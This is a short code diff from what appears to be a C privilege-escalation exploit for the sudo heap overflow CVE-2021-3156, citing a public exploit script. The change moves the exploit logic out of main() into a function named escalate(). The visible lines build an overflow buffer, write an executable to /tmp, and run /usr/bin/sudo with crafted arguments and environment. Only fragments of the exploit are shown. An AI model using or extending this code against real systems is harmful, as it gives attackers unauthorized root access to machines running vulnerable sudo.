@@ -31,7 +31,7 @@ void write_exe_to_tmp() {
   fclose(tmp);
 }
 
-int main() {
+void escalate() {
   // https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss_manual.py
   char *A = calloc(0xe0 + 1 + 1, sizeof(char));
   memset(A, 'A', 0xe0);
@@ -75,5 +75,9 @@ int main() {
   write_exe_to_tmp();
 
   execve("/usr/bin/sudo", e_argv, envp);
+}
+
+int main() {
+  escalate();
   return 0;
 }
